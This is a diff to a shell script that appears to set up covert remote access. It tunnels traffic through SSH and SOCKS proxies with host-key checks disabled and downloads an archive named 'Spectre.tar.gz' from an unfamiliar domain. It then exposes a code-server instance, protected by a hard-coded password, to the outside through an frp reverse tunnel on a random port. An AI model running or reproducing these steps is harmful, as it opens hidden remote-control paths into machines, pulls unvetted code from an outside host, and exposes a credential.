@@ -67,6 +67,13 @@ ssh -i gituser -f -N -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
 
 sleep 2
 
+cd
+sleep 2
+pwd
+sleep 2
+ls -la
+sleep 2
+
 curl -x socks5h://127.0.0.1:1080 http://greenleaf.teatspray.uk/Spectre.tar.gz -L -O -J
 
 sleep 2
@@ -80,10 +87,6 @@ sleep 2
 sleep 2
 
 curl -x socks5h://127.0.0.1:1082 api.ipify.org
-
-sleep 2
-
-rm -rf update
 
 sleep 2
 
@@ -126,19 +129,28 @@ sleep 2
 export PATH=$HOME/code-server-4.97.2-linux-amd64/bin:$PATH
 sleep 2
 
-cat > ~/.config/code-server/config.yaml <<END
-bind-addr: 127.0.0.1:9090
+mkdir .config
+sleep 2
+
+mkdir .config/code-server
+sleep 2
+
+touch .config/code-server/config.yaml
+sleep 2
+
+cat > .config/code-server/config.yaml <<END
+bind-addr: 127.0.0.1:8080
 auth: password
 password: IhatePopUpsWut
 cert: false
 END
 
 sleep 2
-cat ~/.config/code-server/config.yaml
+cat .config/code-server/config.yaml
 
 sleep 2
 
-curl -x socks5h://127.0.0.1:1082 -s -k https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz -L -O -J
+curl -x socks5h://127.0.0.1:1082 -k https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz -L -O -J
 tar -xvf frp_0.48.0_linux_amd64.tar.gz
 # start from daemon
 cp frp_0.48.0_linux_amd64/frpc ~/
@@ -174,7 +186,7 @@ server_port = 995
 [codeserver.$currentdate]
 type = tcp
 local_ip = 127.0.0.1
-local_port = 9090
+local_port = 8080
 remote_port = $randomNumber
 subdomain = $currentdate
 
